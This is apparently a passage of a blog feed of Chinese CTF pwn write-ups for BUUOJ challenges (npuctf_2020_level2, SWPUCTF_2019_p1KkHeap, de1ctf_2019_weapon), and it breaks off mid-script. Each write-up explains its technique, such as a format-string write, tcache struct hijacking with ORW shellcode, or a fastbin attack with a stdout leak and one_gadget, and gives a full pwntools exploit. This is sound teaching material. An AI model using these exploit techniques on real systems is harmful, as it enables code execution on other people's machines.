class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_2_23_buu32=[<span class="number">0x3a80c</span>,<span class="number">0x3a80e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line">one_2_23_buu64=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_2_27_32=[<span class="number">0x3d123</span>,<span class="number">0x3d125</span>,<span class="number">0x3d129</span>,<span class="number">0x3d130</span>,<span class="number">0x67b4f</span>,<span class="number">0x67b50</span>,<span class="number">0x1380be</span>,<span class="number">0x1380bf</span>]</span><br><span class="line">one_2_27_64=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">one_2_27_buu32=[<span class="number">0x3cbea</span>,<span class="number">0x3cbec</span>,<span class="number">0x3cbf0</span>,<span class="number">0x3cbf7</span>,<span class="number">0x6729f</span>,<span class="number">0x672a0</span>,<span class="number">0x13573e</span>,<span class="number">0x13573f</span>]</span><br><span class="line">one_2_27_buu64=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span>,ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> one</span><br><span class="line">    bit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> context.arch==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    one=<span class="built_in">eval</span>(<span class="string">&#x27;one_&#x27;</span>+libc_version.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;_&#x27;</span>)+<span class="string">&#x27;_&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit))</span><br><span class="line">    libc=<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+(<span class="keyword">not</span> x)*<span class="string">&#x27;buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        context.log_level=<span class="number">20</span></span><br><span class="line">        p=remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),ELF(libc),p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,length,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note: &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;note: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./npuctf_2020_level2&#x27;</span>,port=<span class="number">26764</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br><span class="line"></span><br><span class="line">shell=libc_addr+one[<span class="number">0</span>]</span><br><span class="line">success(<span class="string">&#x27;shell:&#x27;</span>+<span class="built_in">hex</span>(shell))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">8</span>:<span class="keyword">break</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)+i).encode()+<span class="string">b&#x27;c%9$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    val=shell&amp;<span class="number">0xffff</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(val).encode()+<span class="string">b&#x27;c%35$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    success(<span class="string">&#x27;debug:&#x27;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line">    shell&gt;&gt;=<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">success(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(libc_addr+one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;66666666\0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_p1KkHeap writeup</title>
      <link href="/2021/11/10/SWPUCTF_2019_p1KkHeap/"/>
      <url>/2021/11/10/SWPUCTF_2019_p1KkHeap/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#SWPUCTF_2019_p1KkHeap">SWPUCTF_2019_p1KkHeap</a></p><span id="more"></span><p>这波又刷新了我对2.27版本libc的认知。那就是tcache struct ，话不多说看题。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>64位保护全开，习惯就好。载入IDA查看发现plt表有很多函数，其中有<code>mmap</code>和<code>prctl</code>，<code>prctl</code>最常见的就是设置沙箱规则，<code>mmap</code>最常见的就是直接给一个可读可写可执行的一片内存区域，那么我们返回终端查看一下沙箱规则。</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/1.png" alt="1"></p><p>这个有点复杂，不过大概率就可以认为他给你禁用了<code>execve</code>，其它的基本不用管，大概意思就是<code>write</code>函数的<code>count</code>必须非负，且大小在32位int范围内，并且不能=0x10，有一说一这个0x10并不理解为啥限制这个不能等于0x10，因为我读<code>flag</code>一般是读0x40</p><p>我们看看初始化函数，可以看到<code>mmap</code>分配了一片很大的内存并且是可读可写可执行的权限，那么开了沙箱之后我们就能往里面写<code>orw</code>的<code>shellcode</code>，然后再劫持某些东西让它跳转到这个区域。</p><p>分析逻辑， 经典堆菜单题目，包含了增删改查，但是有一个全局变量一直在++并且循环并非while 1，可以发现这个初始值为0x12，意味着我们只能操作18次。先看删除，发现删除没有把指针清零，存在<code>UAF</code>，但是会把另一个东西清零，并且跟外面一样，删除有次数限制，只有三次机会。添加堆块会现寻找第一个指针不为0的指针，然后分配，最多同时存在八个堆块，size被限定在0x100以内。<code>show</code>会直接打印堆块上面的信息，<code>edit</code>就是根据输入的<code>size</code>读入数据，删除会导致无法edit，但是不影响show，所以这个地方可以用于泄露，后面的利用也都以uaf为基础攻击。</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>这里需要注意，glibc在2.26版本加入了tcache，tcache在堆上管理，会分配一个0x250大小的堆块，这就是一个tcache struct 上面会存储每个size tcache 的个数和tcache第一个堆块的地址。首先double free然后show 泄露heap的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>泄露了之后我们接下来需要申请堆块到tcache struct上面来进行一些操作方便我们修改某些东西。我们都知道，每个大小的tcache bin最多存在7个，超过则会对应进入fastbin 或者 unsorted bin。那么我们把size改成7然后再free 再show就可以泄露libc的地址了。我们还可以顺便把第一个tcache的地址改成那个分配的可读可写可执行的区域，等会直接申请就可以在上面写数据了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>最后比较简单，就是写shellcode orw然后劫持malloc hook而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br></pre></td></tr></table></figure><p>来看看结果吧</p><p><img src="/2021/11/10/SWPUCTF_2019_p1KkHeap/2.png" alt="2"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29949</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./SWPUCTF_2019_p1KkHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;=&#x27;)</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr+<span class="number">0x18</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660010</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>de1ctf_2019_weapon writeup</title>
      <link href="/2021/11/07/de1ctf_2019_weapon/"/>
      <url>/2021/11/07/de1ctf_2019_weapon/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#de1ctf_2019_weapon">de1ctf_2019_weapon</a></p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec一波，保护全开，ida分析，发现时经典的堆菜单题目。有add，delete和edit操作，没有show函数，并且保护全开无法劫持got表。那么这题大概率是要用IO来泄露libc了。</p><p>add函数把堆块申请范围限制在了0x60以内，也就是说我们只能申请fastbin大小的堆块。edit函数就是中规中矩的按照之前的size修改堆块的内容。delete函数在堆块被free之后没有把指针置空存在UAF的漏洞。那么我们的思路大概就是先通过uaf进行堆块重叠然后修改size，free之后得到一个unsorted bin，然后再修改回fastbin将它申请到stdout附近通过IO泄露libc地址，最后再来一次fastbin attack劫持malloc hook放上onegadget 去getshell，这题需要用realloc 调整栈来适应onegadget，我们后面再说。</p><h2 id="泄露libc的地址"><a href="#泄露libc的地址" class="headerlink" title="泄露libc的地址"></a>泄露libc的地址</h2><p>因为地址都是未知的，所以一开始要通过释放两个相同大小的fastbin来让其中一个fastbin中留下另一个fastbin的地址，再通过修改最后一字节让fastbin的fd来让第二个chunk申请到可以造成堆重叠的地方便于我们修改size。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))<span class="comment">#在合适的地方伪造chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#提前free让fastbin中存在这个chunk</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/07/de1ctf_2019_weapon/1.png" alt="1"></p><p>可以看到第一个chunk的fd已经有了第四个chunk的地址，并且在第一个堆块中存在一个伪造的0x61作为fake chunk的size，所以接下来我们只要edit 0 \x50就能够产生fastbin attack了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))<span class="comment">#修改第二个堆块的size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#释放unsorted bin 让bin的fd中留下libc的地址</span></span><br><span class="line">edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这一波操作就能成功泄露libc了，但是由于内存页是后三位对齐，我们填充是以字节为单位的，所以这里需要爆破一半个字节。</p><h2 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h2><p>这里没什么好说的，就是通过uaf的方法把堆块申请到malloc_hook-0x23的地方，写mallochook为reallochook，再把realloc hook写上对应的one gadget，这里需要注意的是realloc不一定直接就行了，需要适当跳过一些push或这pop之类的指令来调整栈中的0到合适的位置，这里我用了第2个onegadget，用realloc + 4的地方来调整栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最后附上爆破的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 